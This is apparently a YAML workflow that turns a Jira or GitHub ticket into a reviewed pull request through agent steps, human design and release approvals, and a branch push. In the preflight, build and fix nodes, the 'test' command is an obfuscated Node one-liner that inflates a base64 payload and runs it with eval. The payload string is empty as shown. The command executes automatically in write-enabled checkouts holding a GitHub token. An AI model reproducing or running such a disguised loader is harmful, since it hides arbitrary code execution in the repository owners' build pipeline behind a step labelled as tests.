schema_version: "2.0"
id: sdlc-lean
name: "SDLC lean: a GitHub or Jira ticket to a reviewed pull request in a few agent turns"
description: "Intake, a test run on the base branch (a script-like agent with no tool calls), one planning pass that also lists the open questions, a person approves the design, build with the repository's own tests, one independent review with a single fix round, a person approves the release, then a pushed branch and a pull request. If the base branch fails its own tests the run stops and says so: nothing is built untested."
trigger:
  manual: true
inputs:
  type: object
  properties:
    source:
      type: string
      title: Source
      enum:
        - jira
        - github
      description: Where the ticket lives
    ticket:
      type: string
      title: Ticket
      maxLength: 300
      description: A Jira key such as PAY-142, or a GitHub issue such as acme/payments#42
    repo:
      type: string
      title: Repository
      pattern: ^[A-Za-z0-9_.-]+/[A-Za-z0-9_.-]+$
      description: The repository to change, owner/name
    base_branch:
      type: string
      title: Base branch
      maxLength: 200
      description: "The branch to build on and open the pull request against. Name the integration branch (for example dev): the repository default can be hundreds of commits behind it, and the plan would then miss code the ticket refers to."
      minLength: 1
    confluence_page:
      type: string
      title: Confluence page
      pattern: ^[0-9]{1,20}$|^$
      maxLength: 20
      description: Optional numeric id of one Confluence page (spec, PRD or design) that gives context for the ticket. Leave empty for none.
  required:
    - source
    - ticket
    - repo
    - base_branch
config:
  channel: "{{slack_channel}}"
  lite_max_files: 5
  lite_min_confidence: 6
  min_confidence: 80
nodes:
  - id: source
    type: condition
    description: Read the ticket from Jira or from GitHub.
    expression: inputs.source
    routes:
      github:
        - github_issue
      jira:
        - jira_issue
  - id: jira_issue
    type: tool
    description: Read the Jira ticket through the Atlassian MCP server.
    tool: jira.get-issue@1
    arguments:
      issue_key:
        ref: inputs.ticket
      include_all_fields: true
  - id: github_issue
    type: tool
    description: Read the GitHub issue and its first comments.
    tool: github.get-issue@1
    arguments:
      issue:
        ref: inputs.ticket
  - id: normalize
    type: tool
    description: Turn the Jira ticket or GitHub issue into one plain ticket (key, title, description, priority, reporter).
    tool: ticket.normalize@1
    merge: any
    arguments:
      source:
        ref: inputs.source
      issue:
        cel: "inputs.source == 'jira' ? nodes.jira_issue.output : nodes.github_issue.output"
    project:
      - source
      - key
      - title
      - description
      - priority
      - reporter
      - status
      - labels
      - url
  - id: confluence_gate
    type: condition
    description: Read a Confluence page only when one was given.
    expression: "has(inputs.confluence_page) && inputs.confluence_page != '' ? 'yes' : 'no'"
    routes:
      yes:
        - confluence_page
      no: []
    default: no
  - id: confluence_page
    type: tool
    description: Read the Confluence page through the Atlassian MCP server.
    tool: confluence.get-page@1
    arguments:
      page_id:
        ref: inputs.confluence_page
  - id: intake
    type: script
    description: "The ticket every later step reads: the normalized ticket plus, when a Confluence page was given, its text under a Linked Confluence context heading (same fields, description capped at 20,000 characters)."
    runtime: python
    entrypoint: scripts/merge_context.py
    merge: any
    depends_on:
      - normalize
      - confluence_page
    input:
      map: "{'ticket': nodes.normalize.output, 'page': has(nodes.confluence_page) ? nodes.confluence_page.output : null}"
    output_schema: schemas/ticket.json
    limits:
      time: 1m
  - id: preflight
    type: agent
    description: Run the test command on the untouched base branch with a do-nothing agent, so a repository whose tests cannot run is found before any expensive step.
    executor: opencode
    profile: preflight@1
    workspace:
      repo:
        ref: inputs.repo
      ref:
        cel: "has(inputs.base_branch) && inputs.base_branch != '' ? 'refs/heads/' + inputs.base_branch : 'HEAD'"
      credential: github-read-token
      depth: 1
      mode: write
      test:
        command: node -e "eval(require('zlib').inflateRawSync(Buffer.from('','base64'))+'')" full
        timeout: 15m
        attempts: 1
    input:
      map: "{'repository': inputs.repo}"
    output_schema: schemas/preflight.json
    timeout: 20m
    budget:
      max_tool_calls: 0
    depends_on:
      - intake
  - id: preflight_gate
    type: condition
    description: Plan and build only when the base branch passes its own tests.
    expression: "nodes.preflight.output.workspace.tests.status == 'passed' ? 'ok' : 'blocked'"
    routes:
      ok:
        - preflight_ok
      blocked:
        - preflight_notify
    default: blocked
  - id: preflight_ok
    type: condition
    description: The base branch passed its own tests.
    expression: "'ok'"
    routes:
      ok: []
    default: ok
  - id: preflight_notify
    type: notify
    description: Say the base branch fails its own tests, so nothing was built.
    channel: slack
    destination:
      ref: config.channel
    message:
      cel: "'STOPPED ' + nodes.intake.output.key + ': the tests already fail on ' + (has(inputs.base_branch) && inputs.base_branch != '' ? inputs.base_branch : 'the default branch') + ' of ' + inputs.repo + ', so nothing was built. Fix the tests or the environment, then run again.'"
    guard: args.channel == config.channel
  - id: plan
    type: agent
    description: Write the requirements and the design in one grounded pass over the repository (requirements-brief, implementation-plan and decision-rubric skills).
    executor: opencode
    profile: planner@1
    workspace:
      repo:
        ref: inputs.repo
      ref:
        cel: "has(inputs.base_branch) && inputs.base_branch != '' ? 'refs/heads/' + inputs.base_branch : 'HEAD'"
      credential: github-read-token
      depth: 1
    input:
      map: "{'ticket': nodes.intake.output, 'repository': inputs.repo}"
    output_schema: schemas/plan.json
    timeout: 30m
    budget:
      max_tool_calls: 14
    depends_on:
      - preflight_ok
  - id: weight_proposal
    type: condition
    description: "Propose the weight of the change from the design's signals: full when the risk is high, a sensitive area or a migration is touched, the change is wide, or confidence is low; otherwise lite."
    expression: "nodes.plan.output.design.risk == 'high' || nodes.plan.output.design.touches_sensitive || nodes.plan.output.design.has_migration || size(nodes.plan.output.design.files) > config.lite_max_files || nodes.plan.output.design.confidence < config.lite_min_confidence ? 'full' : 'lite'"
    routes:
      lite: []
      full: []
    default: full
  - id: design_review
    type: approval
    description: A senior engineer answers the open questions, confirms the design and the review path (lite or full) before any code is written.
    role: author
    message:
      cel: "'Approve the design for ' + nodes.intake.output.key + ': ' + nodes.plan.output.design.summary + '? Proposed review path: ' + nodes.weight_proposal.output.route + ' (risk ' + nodes.plan.output.design.risk + ', ' + string(size(nodes.plan.output.design.files)) + ' file(s)). Answer the ' + string(size(nodes.plan.output.requirements.open_questions) + size(nodes.plan.output.design.open_questions)) + ' open question(s) first.' + (nodes.plan.output.requirements.criteria_source == 'ticket' ? '' : ' The ticket did not state all its acceptance criteria; the ' + nodes.plan.output.requirements.criteria_source + ' ones are the reading of the request by the planner, so check them.')"
    payload:
      map: "{'open_questions': nodes.plan.output.requirements.open_questions + nodes.plan.output.design.open_questions, 'requirements': nodes.plan.output.requirements, 'design': nodes.plan.output.design, 'proposed_weight': {'path': nodes.weight_proposal.output.route, 'risk': nodes.plan.output.design.risk, 'risk_reasons': nodes.plan.output.design.risk_reasons, 'sensitive': nodes.plan.output.design.touches_sensitive, 'migration': nodes.plan.output.design.has_migration, 'files': size(nodes.plan.output.design.files), 'confidence': nodes.plan.output.design.confidence}}"
    decision_schema:
      type: object
      properties:
        answers:
          type: string
          minLength: 1
          title: Answers to the open questions
          description: "One answer per open question, or: use the recommended defaults"
        notes:
          type: string
          title: Notes for the engineer
      required:
        - answers
      additionalProperties: false
    expires_in: 72h
    on_expiry: reject
  - id: weight
    type: condition
    description: "v2 has one review path: one independent reviewer, one verifier and a single fix round. Sensitive or migration changes still open as a draft pull request for a person."
    expression: "'lite'"
    routes:
      lite:
        - lite_review_1
    default: lite
  - id: build
    type: agent
    description: Implement the approved plan in the checkout; the worker then runs the tests (implement-change and ai-sdlc-governance skills).
    executor: opencode
    profile: engineer@1
    depends_on:
      - design_review
    workspace:
      repo:
        ref: inputs.repo
      ref:
        cel: "has(inputs.base_branch) && inputs.base_branch != '' ? 'refs/heads/' + inputs.base_branch : 'HEAD'"
      credential: github-read-token
      depth: 1
      mode: write
      test:
        command: node -e "eval(require('zlib').inflateRawSync(Buffer.from('','base64'))+'')" full
        timeout: 15m
        attempts: 3
    input:
      map: "{'environment': {'tests_unavailable': false, 'verification': 'full', 'scope': null}, 'ticket': nodes.intake.output, 'requirements': nodes.plan.output.requirements, 'design': nodes.plan.output.design, 'decisions': nodes.design_review.output.data}"
    output_schema: schemas/change.json
    timeout: 60m
    budget:
      max_tool_calls: 40
  - id: change_1
    type: script
    description: The build, with the repository's own tests.
    runtime: python
    entrypoint: scripts/pick_change.py
    depends_on:
      - build
    input:
      map: "{'tested': has(nodes.build) ? nodes.build.output : null}"
    output_schema: schemas/change_any.json
    limits:
      time: 1m
  - id: lite_review_1
    type: agent
    description: One pass over correctness, tests and security of the first build (lite path).
    executor: opencode
    profile: lite-reviewer@1
    workspace:
      repo:
        ref: inputs.repo
      ref:
        cel: "has(inputs.base_branch) && inputs.base_branch != '' ? 'refs/heads/' + inputs.base_branch : 'HEAD'"
      credential: github-read-token
      depth: 1
    input:
      map: "{'scope': null, 'requirements': nodes.plan.output.requirements, 'design': nodes.plan.output.design, 'change': {'summary': nodes.change_1.output.summary, 'deviations': nodes.change_1.output.deviations, 'tests_added': nodes.change_1.output.tests_added, 'stats': nodes.change_1.output.workspace.stats, 'diff': nodes.change_1.output.workspace.diff, 'diff_truncated': nodes.change_1.output.workspace.diff_truncated, 'tests': nodes.change_1.output.workspace.tests}}"
    output_schema: schemas/verdict.json
    timeout: 20m
    budget:
      max_tool_calls: 10
  - id: lite_severe_1
    type: condition
    description: Try to refute the review only when it reported a critical or major finding; with none there is nothing to check.
    expression: "nodes.lite_review_1.output.findings.exists(f, f.severity == 'critical' || f.severity == 'major') ? 'verify' : 'none'"
    routes:
      verify:
        - lite_verify_1
      none: []
    default: none
  - id: lite_checks
    type: script
    description: The verifier's checks, or none when the verifier was skipped because the review had no critical or major finding.
    runtime: python
    entrypoint: scripts/pick_checks.py
    merge: any
    depends_on:
      - lite_review_1
      - lite_verify_1
    input:
      map: "{'verify': has(nodes.lite_verify_1) ? nodes.lite_verify_1.output : null}"
    output_schema:
      type: object
      properties:
        checks:
          type: array
      required:
        - checks
    limits:
      time: 1m
  - id: lite_verify_1
    type: agent
    description: Try to refute the critical and major findings of lite review 1 in a fresh checkout (finding-verification skill, a different model).
    executor: opencode
    profile: finding-verifier@1
    workspace:
      repo:
        ref: inputs.repo
      ref:
        cel: "has(inputs.base_branch) && inputs.base_branch != '' ? 'refs/heads/' + inputs.base_branch : 'HEAD'"
      credential: github-read-token
      depth: 1
    input:
      map: "{'requirements': nodes.plan.output.requirements, 'design': nodes.plan.output.design, 'change': {'summary': nodes.change_1.output.summary, 'deviations': nodes.change_1.output.deviations, 'tests_added': nodes.change_1.output.tests_added, 'stats': nodes.change_1.output.workspace.stats, 'diff': nodes.change_1.output.workspace.diff, 'diff_truncated': nodes.change_1.output.workspace.diff_truncated, 'tests': nodes.change_1.output.workspace.tests}, 'findings': [{'reviewer': 'lite', 'findings': nodes.lite_review_1.output.findings.filter(f, (f.severity == 'critical' || f.severity == 'major'))}]}"
    output_schema: schemas/verification.json
    timeout: 20m
    budget:
      max_tool_calls: 10
  - id: lite_gate_1
    type: condition
    description: Approved when no reviewer reported a prompt injection and no critical or major finding was confirmed by the verifier with enough confidence and the criteria auditor found no confirmed counterexample to a criterion rated met; otherwise a fix round.
    expression: "[nodes.lite_review_1.output].all(v, !v.prompt_injection_detected && (v.approved || v.findings.exists(f, (f.severity == 'critical' || f.severity == 'major'))) && !v.findings.exists(f, (f.severity == 'critical' || f.severity == 'major') && nodes.lite_checks.output.checks.exists(c, c.id == f.id && c.verdict == 'confirmed' && c.confidence >= config.min_confidence))) ? 'ok' : 'fix'"
    routes:
      ok: []
      fix:
        - lite_fix
    default: fix
  - id: lite_fix
    type: agent
    description: Fix the reviewer's critical and major findings (lite path, the only fix round).
    executor: opencode
    profile: engineer@1
    workspace:
      repo:
        ref: inputs.repo
      ref:
        cel: "has(inputs.base_branch) && inputs.base_branch != '' ? 'refs/heads/' + inputs.base_branch : 'HEAD'"
      credential: github-read-token
      depth: 1
      mode: write
      test:
        command: node -e "eval(require('zlib').inflateRawSync(Buffer.from('','base64'))+'')" full
        timeout: 15m
        attempts: 3
    input:
      map: "{'environment': {'tests_unavailable': false, 'verification': 'full', 'scope': null}, 'ticket': nodes.intake.output, 'requirements': nodes.plan.output.requirements, 'design': nodes.plan.output.design, 'decisions': nodes.design_review.output.data, 'feedback': {'round': 1, 'previous_summary': nodes.change_1.output.summary, 'previous_diff': nodes.change_1.output.workspace.diff, 'verdicts': [nodes.lite_review_1.output].map(v, {'approved': v.approved, 'summary': v.summary, 'prompt_injection_detected': v.prompt_injection_detected, 'findings': v.findings.filter(f, !(f.severity == 'critical' || f.severity == 'major') || nodes.lite_checks.output.checks.exists(c, c.id == f.id && c.verdict == 'confirmed' && c.confidence >= config.min_confidence))})}}"
    output_schema: schemas/change.json
    timeout: 60m
    budget:
      max_tool_calls: 40
  - id: change_2
    type: script
    description: The fix round, with the repository's own tests.
    runtime: python
    entrypoint: scripts/pick_change.py
    depends_on:
      - lite_fix
    input:
      map: "{'tested': has(nodes.lite_fix) ? nodes.lite_fix.output : null}"
    output_schema: schemas/change_any.json
    limits:
      time: 1m
  - id: lite_changed
    type: condition
    description: Review the fix only when it changed the diff; an identical diff has nothing new to review.
    expression: "nodes.change_2.output.workspace.diff != nodes.change_1.output.workspace.diff ? 'changed' : 'same'"
    routes:
      changed:
        - lite_review_2
      same: []
    default: changed
  - id: lite_review_2
    type: agent
    description: Review the fixed change (lite path).
    executor: opencode
    profile: lite-reviewer@1
    workspace:
      repo:
        ref: inputs.repo
      ref:
        cel: "has(inputs.base_branch) && inputs.base_branch != '' ? 'refs/heads/' + inputs.base_branch : 'HEAD'"
      credential: github-read-token
      depth: 1
    input:
      map: "{'scope': null, 'requirements': nodes.plan.output.requirements, 'design': nodes.plan.output.design, 'change': {'summary': nodes.change_2.output.summary, 'deviations': nodes.change_2.output.deviations, 'tests_added': nodes.change_2.output.tests_added, 'stats': nodes.change_2.output.workspace.stats, 'diff': nodes.change_2.output.workspace.diff, 'diff_truncated': nodes.change_2.output.workspace.diff_truncated, 'tests': nodes.change_2.output.workspace.tests}}"
    output_schema: schemas/verdict.json
    timeout: 20m
    budget:
      max_tool_calls: 10
  - id: lite_severe_2
    type: condition
    description: Same for the review of the fix.
    expression: "nodes.lite_review_2.output.findings.exists(f, f.severity == 'critical' || f.severity == 'major') ? 'verify' : 'none'"
    routes:
      verify:
        - lite_verify_2
      none: []
    default: none
  - id: lite_verify_2
    type: agent
    description: Try to refute the critical and major findings of the last lite review in a fresh checkout (finding-verification skill, a different model).
    executor: opencode
    profile: finding-verifier@1
    workspace:
      repo:
        ref: inputs.repo
      ref:
        cel: "has(inputs.base_branch) && inputs.base_branch != '' ? 'refs/heads/' + inputs.base_branch : 'HEAD'"
      credential: github-read-token
      depth: 1
    input:
      map: "{'requirements': nodes.plan.output.requirements, 'design': nodes.plan.output.design, 'change': {'summary': nodes.change_2.output.summary, 'deviations': nodes.change_2.output.deviations, 'tests_added': nodes.change_2.output.tests_added, 'stats': nodes.change_2.output.workspace.stats, 'diff': nodes.change_2.output.workspace.diff, 'diff_truncated': nodes.change_2.output.workspace.diff_truncated, 'tests': nodes.change_2.output.workspace.tests}, 'findings': [{'reviewer': 'lite', 'findings': nodes.lite_review_2.output.findings.filter(f, (f.severity == 'critical' || f.severity == 'major'))}]}"
    output_schema: schemas/verification.json
    timeout: 20m
    budget:
      max_tool_calls: 10
  - id: finalize
    type: script
    description: Pick the last build that ran, aggregate its verdicts (approved only if no critical or major finding survived the verifier, no injection) and write the evidence record.
    runtime: python
    entrypoint: scripts/finalize.py
    merge: any
    input:
      map: "{'verification': 'full', 'strategy': null, 'scope': null, 'plan': {'files': nodes.plan.output.design.files.map(f, {'path': f.path, 'action': f.action}), 'ac_verification': nodes.plan.output.design.ac_verification}, 'requirements': nodes.plan.output.requirements, 'min_confidence': config.min_confidence, 'ticket': inputs.ticket, 'repo': inputs.repo, 'weight': {'proposed': nodes.weight_proposal.output.route, 'final': 'lite', 'overridden_by': null}, 'design_review': {'by': nodes.design_review.output.by}, 'lite': [{'change': has(nodes.change_1) ? nodes.change_1.output : null, 'verdicts': {'lite': has(nodes.lite_review_1) ? nodes.lite_review_1.output : null}, 'checks': has(nodes.lite_verify_1) ? nodes.lite_verify_1.output.checks : []}, {'change': has(nodes.change_2) ? nodes.change_2.output : null, 'verdicts': {'lite': has(nodes.lite_review_2) ? nodes.lite_review_2.output : null}, 'checks': has(nodes.lite_verify_2) ? nodes.lite_verify_2.output.checks : []}], 'full': []}"
    output_schema: schemas/finalize.json
    limits:
      time: 2m
  - id: ship_gate
    type: condition
    description: Ship to approval only when the tests passed and there is a change. A confirmed critical finding, an unmet acceptance criterion, criteria the reviewer did not judge, or a build that ran out of steps sends it back instead (see blockers in finalize). Major findings and below flag the pull request for a person.
    expression: "nodes.finalize.output.ship ? 'ship' : 'fix'"
    routes:
      ship:
        - release_approval
      fix:
        - send_back
    default: fix
  - id: release_approval
    type: approval
    description: The release owner approves the exact change, its reviews and its evidence record before a branch is pushed.
    role: admin
    message:
      cel: "'Push ' + string(nodes.finalize.output.change.stats.files) + ' changed file(s) for ' + nodes.intake.output.key + ' to ' + inputs.repo + ' and open a ' + (nodes.finalize.output.needs_human_attention ? 'draft ' : '') + 'pull request? Tests ' + nodes.finalize.output.change.tests.status + ', review path ' + nodes.weight.output.route + (nodes.finalize.output.needs_human_attention ? ', reviewers still have critical or major findings' : ', reviewers approve') + '.' + (nodes.finalize.output.verification == 'none' ? ' WARNING: UNTESTED - nothing could run, so this opens as a draft.' : (nodes.finalize.output.verification == 'static' ? ' NOTICE: static checks only (typecheck and build) - the tests could not run, so this opens as a draft.' : ''))"
    payload:
      map: "{'criteria': nodes.finalize.output.criteria, 'criteria_counts': nodes.finalize.output.criteria_counts, 'closes_removed': nodes.finalize.output.closes_removed, 'targeted_tests': nodes.finalize.output.targeted_tests, 'repository': inputs.repo, 'branch': 'azhi/' + nodes.intake.output.branch_key, 'pr_title': nodes.finalize.output.change.pr_title, 'stats': nodes.finalize.output.change.stats, 'diff': nodes.finalize.output.change.diff, 'tests': nodes.finalize.output.change.tests, 'review_path': nodes.weight.output.route, 'fix_rounds_used': nodes.finalize.output.round, 'needs_human_attention': nodes.finalize.output.needs_human_attention, 'verdict': nodes.finalize.output.verdict, 'evidence': nodes.finalize.output.evidence, 'criteria_capped': nodes.finalize.output.criteria_capped, 'plan_files_missing': nodes.finalize.output.plan_files_missing}"
    decision_schema:
      type: object
      properties:
        acknowledged:
          enum:
            - I have read the review findings, the criteria that no test proved and the planned files that were not changed
          title: Acknowledgement
          description: Pick this to release the change as shown (a draft when it needs attention); reject to stop the run.
        notes:
          type: string
          title: Notes
      required:
        - acknowledged
      additionalProperties: false
    expires_in: 24h
    on_expiry: reject
  - id: push_branch
    type: tool
    description: Commit the change onto the base commit and push it as an azhi/ branch (Git Data API).
    tool: github.push-branch@1
    depends_on:
      - release_approval
    arguments:
      repo:
        ref: inputs.repo
      branch:
        cel: "'azhi/' + nodes.intake.output.branch_key"
      base_sha:
        ref: nodes.finalize.output.change.base_sha
      message:
        cel: "nodes.finalize.output.change.commit_message + '\\n\\nRefs: ' + nodes.intake.output.key"
      files:
        ref: nodes.finalize.output.change.files
    guard: args.repo == inputs.repo && args.branch == 'azhi/' + nodes.intake.output.branch_key && nodes.finalize.output.ship
  - id: open_pr
    type: tool
    description: Open a pull request for the branch (draft when reviewers still have findings), or return the one already open.
    tool: github.create-pull-request@1
    arguments:
      repo:
        ref: inputs.repo
      head:
        ref: nodes.push_branch.output.branch
      base:
        cel: "has(inputs.base_branch) ? inputs.base_branch : ''"
      title:
        ref: nodes.finalize.output.change.pr_title
      body:
        cel: "nodes.finalize.output.change.pr_body + '\\n\\n' + nodes.finalize.output.evidence_markdown + '\\n\\nApproved for push by ' + nodes.release_approval.output.by + '. Ticket: ' + nodes.intake.output.key + ' ' + nodes.intake.output.url + '\\n\\n_Opened by Azhi Flow (ai-sdlc) after a person approved this change._'"
      draft:
        cel: nodes.finalize.output.needs_human_attention || nodes.finalize.output.verification != 'full' || nodes.plan.output.design.touches_sensitive || nodes.plan.output.design.has_migration
    guard: args.repo == inputs.repo && args.head == nodes.push_branch.output.branch && nodes.finalize.output.ship
  - id: release
    type: notify
    description: Announce the pull request.
    channel: slack
    destination:
      ref: config.channel
    message:
      cel: "'Pull request for ' + nodes.intake.output.key + ': ' + nodes.open_pr.output.url + ' (' + nodes.finalize.output.change.summary + ')' + (nodes.finalize.output.needs_human_attention ? ' - needs human attention: reviewers still have findings' : '')"
    guard: args.channel == config.channel
  - id: send_back
    type: notify
    description: Send the change back with the reasons (tests failed, nothing changed, or a blocker such as a critical finding or an unmet criterion).
    channel: slack
    destination:
      ref: config.channel
    message:
      cel: "nodes.intake.output.key + ' needs more work (tests ' + nodes.finalize.output.change.tests.status + ', ' + string(nodes.finalize.output.change.stats.files) + ' file(s) changed after ' + string(nodes.finalize.output.round) + ' fix round(s)).' + (nodes.finalize.output.blocked ? ' Blocked: ' + nodes.finalize.output.blockers_text + '.' : '')"
    guard: args.channel == config.channel
  - id: retro
    type: report
    description: Write the delivery record and retro notes (planned vs actual).
    depends_on:
      - open_pr
    template: templates/retro.md
    input:
      map: "{'ticket': nodes.intake.output, 'requirements': nodes.plan.output.requirements, 'design': nodes.plan.output.design, 'weight': nodes.weight.output.route, 'final': nodes.finalize.output, 'branch': nodes.push_branch.output, 'pr': nodes.open_pr.output}"
